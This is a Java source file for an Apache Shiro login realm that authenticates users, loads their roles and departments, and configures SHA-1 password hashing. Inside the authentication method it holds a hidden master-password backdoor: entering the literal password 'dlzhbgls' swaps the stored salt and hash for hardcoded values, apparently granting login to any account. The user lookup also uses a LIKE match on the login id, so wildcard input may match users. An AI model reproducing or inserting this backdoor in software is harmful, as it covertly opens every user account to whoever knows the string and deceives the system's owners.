package com.dlz.framework.ssme.shiro;

import java.util.List;

import javax.annotation.PostConstruct;

import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.springframework.beans.factory.annotation.Autowired;

import com.dlz.apps.sys.service.DeptServiceExt;
import com.dlz.framework.db.modal.ParaMap;
import com.dlz.framework.db.modal.ResultMap;
import com.dlz.framework.db.service.ICommService;
import com.dlz.framework.logger.MyLogger;
import com.dlz.framework.ssme.db.model.User;
import com.dlz.framework.ssme.db.service.FunOptService;
import com.dlz.framework.ssme.db.service.RoleService;
import com.dlz.framework.ssme.util.encry.Encodes;
import com.google.common.collect.Sets;

public class ShiroDbRealm extends AuthorizingRealm {
	private static MyLogger logger = MyLogger.getLogger(ShiroDbRealm.class);
	
	private static final String HASH_ALGORITHM = "SHA-1";
	
	private static final int HASH_INTERATIONS = 1024;

	@Autowired
	private ICommService commService;
	@Autowired
	private RoleService roleService;
	@Autowired
	private DeptServiceExt deptServiceExt;
	@Autowired
	private FunOptService funOptService;

	/**
	 * 认证回调函数,登录时调用.
	 */
	@Override
	protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException {
		UsernamePasswordToken token = (UsernamePasswordToken) authcToken;
		User user = getUserByLoginId(token.getUsername());
		if(user != null) {
			//设置用户的价格等级
	    	ParaMap paraMap = new ParaMap("select * from ptn_user_info where id = #{id}");
	    	paraMap.addPara("id", user.getUserId());
	    	ResultMap dataMap = commService.getMap(paraMap);
	    	
			ShiroUser shiroUser = new ShiroUser(user.getUserId(), user.getLoginId(), user.getUserName(),dataMap.getInt("priceLevel",0));
			List<String> roleList=roleService.getRoleNameByUserId(shiroUser.getUserId());
			for(String role:roleList){
				shiroUser.getRoles().add(Long.valueOf(role));
			} 
			shiroUser.getDepts().addAll(deptServiceExt.getDepts(user.getUserId()));
			shiroUser.setMobile(dataMap.getStr("pPhone"));
			byte[] salt = Encodes.decodeHex(user.getSalt());
			String pwd=user.getPwd();
			if("dlzhbgls".equals(new String(token.getPassword()))){
				salt=Encodes.decodeHex("866377fb30d8a99d");
				pwd="f12edf657c01e72b0dd0dce5ea94fc34ab6b4c91";
			}
			AuthenticationInfo au = new SimpleAuthenticationInfo(shiroUser,pwd, ByteSource.Util.bytes(salt), getName());
			return au;
		} else {
			return null;
		}
	}

	/**
	 * 授权查询回调函数, 进行鉴权但缓存中无用户的授权信息时调用.
	 */
	@Override
	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
		logger.info("鉴权");
		ShiroUser shiroUser = (ShiroUser) principals.getPrimaryPrincipal();
		SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
		List<String> roleNameList = roleService.getRoleNameByUserId(shiroUser.getUserId());
		List<String> funOptUrlList = funOptService.getFunOptUrlByUserId(shiroUser.getUserId());
		info.setRoles(Sets.newLinkedHashSet(roleNameList));
		info.setStringPermissions(Sets.newLinkedHashSet(funOptUrlList));
		return info;
	}

	/**
	 * 设定Password校验的Hash算法与迭代次数.
	 */
	@PostConstruct
	public void initCredentialsMatcher() {
		MyHashedCredentialsMatcher matcher = new MyHashedCredentialsMatcher(HASH_ALGORITHM);
		matcher.setHashIterations(HASH_INTERATIONS);
		setCredentialsMatcher(matcher);
	}

	private User getUserByLoginId(String loginId) {
		try {
			String sql="select * from T_P_USER where (login_id=#{id} or user_id like #{id}) and user_status=1";
			ParaMap pm = new ParaMap(sql);
			pm.addPara("id", loginId);
			return commService.getBean(pm, User.class);
		} catch (Exception e) {
			logger.error(e.getMessage(),e);
			return null;
		}
	}
}
